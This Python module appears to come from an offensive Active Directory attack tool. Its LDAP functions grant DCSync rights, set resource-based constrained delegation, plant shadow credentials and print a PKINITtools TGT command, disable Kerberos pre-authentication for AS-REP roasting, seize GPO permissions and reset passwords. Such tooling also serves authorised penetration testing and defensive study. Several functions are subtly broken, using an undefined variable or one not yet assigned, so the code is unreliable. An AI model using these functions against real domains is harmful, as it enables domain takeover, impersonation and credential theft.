import ldap3
import random
import string
from functools import wraps

from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
from ldap3.protocol.formatters.formatters import format_sid
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from impacket.ldap import ldaptypes

from .exceptions import BloodyError, ResultError, NoResultError
from .utils import createACE, createEmptySD
from .utils import resolvDN, getDefaultNamingContext
from .utils import rpcChangePassword
from .utils import userAccountControl
from .utils import LOG


functions = []


def register_module(f):
    functions.append((f.__name__, f))

    @wraps(f)
    def wrapper(*args, **kwds):
        return f(*args, **kwds)

    return wrapper


@register_module
def getGroupMembers(conn, identity):
    """
    Return the list of member for a group whose identity is given as parameter
    """
    ldap_conn = conn.getLdapConnection()
    group_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(group_dn, '(objectClass=group)', attributes='member')
    members = ldap_conn.response[0]['attributes']['member']
    LOG.info(members)
    return members


@register_module
def getObjectAttributes(conn, identity):
    """
    Fetch LDAP attributes for the identity (group or user) provided
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(dn, '(objectClass=*)', attributes='*')
    attributes = ldap_conn.response[0]['attributes']
    LOG.info(attributes)
    return attributes


@register_module
def getDefaultPasswordPolicy(conn):
    """
    """
    ldap_conn = conn.getLdapConnection()
    domain_dn = getDefaultNamingContext(ldap_conn)
    ldap_conn.search(domain_dn, '(objectClass=domain)', attributes='minPwdLength')
    attributes = ldap_conn.response[0]['attributes']
    LOG.info(attributes)
    return attributes



@register_module
def addUser(conn, sAMAccountName, password, ou=None):
    """
    Add a new user in the LDAP database
    By default the user object is put in the OU Users
    This can be changed with the ou parameter
    """
    ldap_conn = conn.getLdapConnection()

    if ou:
        user_dn = f"cn={sAMAccountName},{ou}"
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"

    user_cls = ['top', 'person', 'organizationalPerson', 'user']
    attr = {'objectClass': user_cls}
    attr["distinguishedName"] = user_dn
    attr["sAMAccountName"] = sAMAccountName
    attr["userAccountControl"] = 544

    ldap_conn.add(user_dn, attributes=attr)

    if ldap_conn.result['description'] == 'success':
        changePassword(conn, sAMAccountName, password)
    else:
        LOG.error(sAMAccountName + ': ' + ldap_conn.result['description'])
        raise BloodyError(ldap_conn.result['description'])


@register_module
def delObject(conn, identity):
    """
    Delete an object (user or group) from the Directory based on the identity provided
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    LOG.debug(f"Trying to remove {dn}")
    ldap_conn.delete(dn)
    LOG.info(f"[+] {dn} has been removed")


@register_module
def addUserToGroup(conn, member, group):
    """
    Add an object to a group
        member: the user or group to add into the group
        group: the group to add to
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    LOG.debug(f"[+] {member} found at {member_dn}")
    group_dn = resolvDN(ldap_conn, group)
    LOG.debug(f"[+] {group} found at {group_dn}")
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, member_dn, group_dn, raise_error=True)
    LOG.info(f"[+] Adding {member_dn} to {group_dn}")


@register_module
def getObjectsInOu(conn, base_ou, object_type='*'):
    """
    List the object present in an organisational unit
    base_ou: the ou to target
    object_type: the type of object to fetch (user/computer or * to have them all)
    """
    ldap_conn = conn.getLdapConnection()
    ldap_conn.search(base_ou, f'(objectClass={object_type})')
    res = [entry['dn'] for entry in ldap_conn.response if entry['type'] == 'searchResEntry']
    return res


@register_module
def getOusInOu(conn, base_ou):
    """
    List the user present in an organisational unit
    """
    containers = getObjectsInOu(conn, base_ou, "container")
    for container in containers:
        LOG.info(container)
    return containers


@register_module
def getUsersInOu(conn, base_ou):
    """
    List the user present in an organisational unit
    """
    users = getObjectsInOu(conn, base_ou, "user")
    for user in users:
        LOG.info(user)
    return users


@register_module
def getComputersInOu(conn, base_ou):
    """
    List the computers present in an organisational unit
    """
    computers = getObjectsInOu(conn, base_ou, "computer")
    for computer in computers:
        LOG.info(computer)
    return computers


@register_module
def delUserFromGroup(conn, member, group):
    """
    Remove member from group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    group_dn = resolvDN(ldap_conn, group)
    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)


@register_module
def addForeignObjectToGroup(conn, user_sid, group_dn):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args:
        foreign object sid
        group dn in which to add the foreign object
    """
    ldap_conn = conn.getLdapConnection()
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)


@register_module
def addDomainSync(conn, identity):
    """
    Give the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
    """
    ldap_conn = conn.getLdapConnection()

    user_sid = getObjectSID(conn, identity)

    # Set SD flags to only query for DACL
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)

    # print_m('Querying domain security descriptor')
    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes='nTSecurityDescriptor', controls=controls)

    secDescData = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "control access" here for the extended attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS

    # these are the GUIDs of the get-changes and get-changes-all extended attributes
    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))

    dn = entry.entry_dn
    data = secDesc.getData()
    ldap_conn.modify(dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)


@register_module
def changePassword(conn, identity, new_pass):
    """
    Change the target password without knowing the old one using LDAPS or RPC
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new_pass: new password for the target
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    # If LDAPS is not supported use SAMR
    if conn.conf.scheme == "ldaps":
        modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
        if ldap_conn.result['result'] == 0:
            LOG.info('[+] Password changed successfully!')
        else:
            raise ResultError(ldap_conn.result)
    else:
        # Check if identity is sAMAccountName
        sAMAccountName = identity
        for marker in ["dn=", "s-1", "{"]:
            if marker in identity:
                ldap_filter = '(objectClass=*)'
                entries = ldap_conn.search(target_dn, ldap_filter, attributes=['SAMAccountName'])
                try:
                    sAMAccountName = entries[0]['sAMAccountName']
                except IndexError:
                    raise NoResultError(target_dn, ldap_filter)
                break

        rpcChangePassword(conn, sAMAccountName, new_pass)


@register_module
def addComputer(conn, hostname, password, ou=None):
    """
    Add a new computer in the LDAP database
    By default the computer object is put in the OU CN=Computers
    This can be changed with the ou parameter
    Args:
        hostname: computer name (without the trailing $ symbol)
        password: the password that will be set for the computer account
        ou: Optional parameters - Where to put the computer object in the LDAP directory
    """
    ldap_conn = conn.getLdapConnection()

    sAMAccountName = hostname + '$'
    domain = conn.conf.domain

    if ou:
        computer_dn = f'cn={sAMAccountName},{ou}'
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        computer_dn = f'cn={sAMAccountName},cn=Computers,{naming_context}'

    computer_cls = ['top', 'person', 'organizationalPerson', 'user', 'computer']
    computer_spns = [f'HOST/{hostname}',
                     f'HOST/{hostname}.{domain}',
                     f'RestrictedKrbHost/{hostname}',
                     f'RestrictedKrbHost/{hostname}.{domain}',
                     ]
    attr = {'objectClass': computer_cls,
            'distinguishedName': computer_dn,
            'sAMAccountName': sAMAccountName,
            'userAccountControl': 0x1000,
            'dnsHostName': f'{hostname}.{domain}',
            'servicePrincipalName': computer_spns,
            }

    ldap_conn.add(computer_dn, attributes=attr)
    LOG.info(ldap_conn.result)

    changePassword(conn, sAMAccountName, password)


@register_module
def setRbcd(conn, spn_id, target_id):
    """
    Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
    Args:
        spn_id: sAMAccountName, DN, GUID or SID of the SPN
        target_id: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, target_id)
    spn_sid = getObjectSID(conn, spn_sid)

    ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
    rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values

    if len(rbcd_attrs) > 0:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=rbcd_attrs[0])
        LOG.debug('Currently allowed sids:')
        for ace in sd['Dacl'].aces:
            LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
    else:
        sd = createEmptySD()

    sd['Dacl'].aces.append(createACE(spn_sid))
    ldap_conn.modify(target_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
    if ldap_conn.result['result'] == 0:
        LOG.info('Delegation rights modified successfully!')
        LOG.info('%s can now impersonate users on %s via S4U2Proxy', spn_id, target_id)
    else:
        raise ResultError(ldap_conn.result)


@register_module
def delRbcd(conn, spn_id, target_id):
    """
    Delete Resource Based Constraint Delegation (RBCD) on the target for the SPN provided
    Args:
        spn_sid: object SID of the SPN
        target_id: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, target_id)
    spn_sid = getObjectSID(conn, spn_sid)

    ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
    rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values

    if len(rbcd_attrs) < 1:
        LOG.info("The attribute msDS-AllowedToActOnBehalfOfOtherIdentity doesn't exist for %s",target_id)
        return
    
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=rbcd_attrs[0])
    
    aces_to_keep = []
    LOG.debug('Currently allowed sids:')
    for ace in sd['Dacl'].aces:
        ace_sid = ace['Ace']['Sid']
        if ace_sid.getData() == spn_sid:
            LOG.debug('    %s (will be removed)' % ace_sid.formatCanonical())
        else:
            LOG.debug('    %s' % ace_sid.formatCanonical())
            aces_to_keep.append(ace)

    # Remove the attribute if there is no ace to keep
    if len(aces_to_keep) < 1:
        attr_values = []
    else:
        sd['Dacl'].aces = aces_to_keep
        attr_values = [sd.getData()]

    ldap_conn.modify(target_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, attr_values]})
    if ldap_conn.result['result'] == 0:
        LOG.info('Delegation rights modified successfully!')
    else:
        raise ResultError(ldap_conn.result)

@register_module
def setShadowCredentials(conn, identity, outfilePath=None):
    """
    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        outfilePath: file path for the generated certificate (default is current path)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    LOG.debug("Generating certificate")
    certificate = X509Certificate2(subject=identity, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    LOG.debug("Certificate generated")
    LOG.debug("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())

    ldap_conn.search(target_dn, '(objectClass=*)', attributes=['msDS-KeyCredentialLink'])

    new_values = ldap_conn.entries[0]['msDS-KeyCredentialLink'].raw_values + [keyCredential.toDNWithBinary().toString()]
    LOG.debug(new_values)
    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
    if ldap_conn.result['result'] == 0:
        LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
        if outfilePath is None:
            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
            LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
        else:
            path = outfilePath
        certificate.ExportPEM(path_to_files=path)
        LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
        LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
        LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
        LOG.info("Run the following command to obtain a TGT")
        LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', identity, path))

    else:
        raise ResultError(ldap_conn.result)


@register_module
def delShadowCredentials(conn, identity):
    """
    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCrednetialLink attribute of the user provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    # TODO: remove only the public key corresponding to the certificate provided
    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
    if ldap_conn.result['result'] == 0:
        LOG.info("msDS-KeyCredentialLink attribute of the target object updated")
    else:
        raise ResultError(ldap_conn.result)


@register_module
def dontReqPreauth(conn, identity, enable):
    """
    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
    You must have a write permission on the UserAccountControl attribute of the target user
    Args:
        sAMAccountName, DN, GUID or SID of the target
        set the flag on the UserAccountControl attribute (default is True)
    """
    ldap_conn = conn.getLdapConnection()

    UF_DONT_REQUIRE_PREAUTH = 4194304
    userAccountControl(ldap_conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)


@register_module
def setAccountDisableFlag(conn, identity, enable):
    """
    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
    You must have write permission on the UserAccountControl attribute of the target
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        enable: True to enable the identity or False to disable it
    """
    ldap_conn = conn.getLdapConnection()

    UF_ACCOUNTDISABLE = 2
    userAccountControl(ldap_conn, identity, enable, UF_ACCOUNTDISABLE)


@register_module
def getObjectSID(conn, identity):
    """
    Get the SID for the given identity
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object
    """
    ldap_conn = conn.getLdapConnection()
    object_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(object_dn, '(objectClass=*)', attributes=['objectSid'])
    object_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
    #LOG.info(format_sid(object_sid))
    return object_sid


@register_module
def modifyGpoACL(conn, identity, gpo):
    """
    Give permission to a user to modify the GPO
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
        gpo: name of the GPO (ldap name)
    """
    ldap_conn = conn.getLdapConnection()

    user_sid = getObjectSID(conn, identity)

    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
    ldap_filter = '(&(objectClass=groupPolicyContainer)(name=%s))' % gpo
    ldap_conn.search(getDefaultNamingContext(ldap_conn), ldap_filter, attributes=['nTSecurityDescriptor'], controls=controls)

    if len(ldap_conn.entries) <= 0:
        raise NoResultError(getDefaultNamingContext(ldap_conn), ldap_filter)
    gpo = ldap_conn.entries[0]

    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
    newace = createACE(user_sid)
    secDesc['Dacl']['Data'].append(newace)
    data = secDesc.getData()

    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
    if ldap_conn.result["result"] == 0:
        LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
    else:
        raise ResultError(ldap_conn.result)
